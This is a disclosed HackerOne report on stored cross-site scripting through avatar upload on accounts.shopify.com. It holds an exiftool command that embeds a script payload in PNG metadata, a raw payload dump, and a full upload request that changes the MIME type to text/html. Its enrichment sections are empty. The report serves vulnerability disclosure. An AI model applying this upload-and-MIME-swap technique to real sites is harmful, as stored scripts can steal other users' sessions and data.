---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '964550'
original_report_id: '964550'
title: XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com
weakness: Violation of Secure Design Principles
team_handle: shopify
created_at: '2020-08-22T03:35:29.693Z'
disclosed_at: '2020-08-30T15:06:46.208Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 45
asset_identifier: accounts.shopify.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- violation-of-secure-design-principles
---

# XSS Stored via Upload avatar PNG [HTML] File in accounts.shopify.com

## Metadata

- HackerOne Report ID: 964550
- Weakness: Violation of Secure Design Principles
- Program: shopify
- Disclosed At: 2020-08-30T15:06:46.208Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello team,

I found unrestricted file upload via avatar in https://accounts.shopify.com/accounts/<ID>,

and XSS Stored in PNG IDAT chunks using exiftool ,

>exiftool command

```
exiftool -Comment="\"><script>alert(prompt('XSS BY ZEROX4'))</script>" xss_comment_exif_metadata_double_quote.png
```


#Payload 

example :

```
�PNG
�
IHDRdp�TtEXtSoftwareAdobe ImageReadyq�e<9tEXtComment"><script>alert(prompt('XSS BY ZEROX4'))</script>
                                                                                                    /-{IDATx���E��K��s�9xd$#���J� %IR$�(���s�9Ñ������evnv���>����q�;;;S�U������\.����=��=�ܿ��BCb����QHyԑEYՑ�s$s�T�:�x���8���إ�}2`���0P����@�(��j�(����D�J�d�%[�
```

>or payload file example

>https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/Files/xss_comment_exif_metadata_double_quote.png

and after select payload you should edit mime type of image[HTML] request with burpsuite, from image/png to text /html.

example:

```
POST /accounts/141376700 HTTP/1.1
Host: accounts.shopify.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://accounts.shopify.com/accounts/141376700
Content-Type: multipart/form-data; boundary=---------------------------20426576427959059782120179951
Content-Length: 13530
Origin: https://accounts.shopify.com
DNT: 1
Connection: close
Cookie: device_id=; _identity_session; __Host-_identity_session_same_site=; _y=; _shopify_y=; _s=; _shopify_s=; _shopify_fs=; subdomain=myzero.myshopify.com; utag_main=; __cfduid=
Upgrade-Insecure-Requests: 1

-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="utf8"

â
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="_method"

patch
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="authenticity_token"

0HXXr+2RHm5QwSvfF4MkpkyouUXgM8Dl/xxxxxx+w+78GWOFVLxSqTOpswgegMl3DgEgKHsV5Qw==
-----------------------------20426576427959059782120179951
Content-Disposition: form-data; name="account[avatar]"; filename="xss_comment_exif_metadata_double_quote.png"
Content-Type: text/html

PNG


```

and the malicious file saved in shopify-assets.shopifycdn.com

>example:
>https://shopify-assets.shopifycdn.com/accounts/production/account/avatar/8df3da6b-3954-4073-a397-27a4d41db106/avatar_36x36_crop_center.png?v=1598066255

PoC:
{F958928}


{F958927}

## Impact

steal sensitive user data and phishing accounts

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
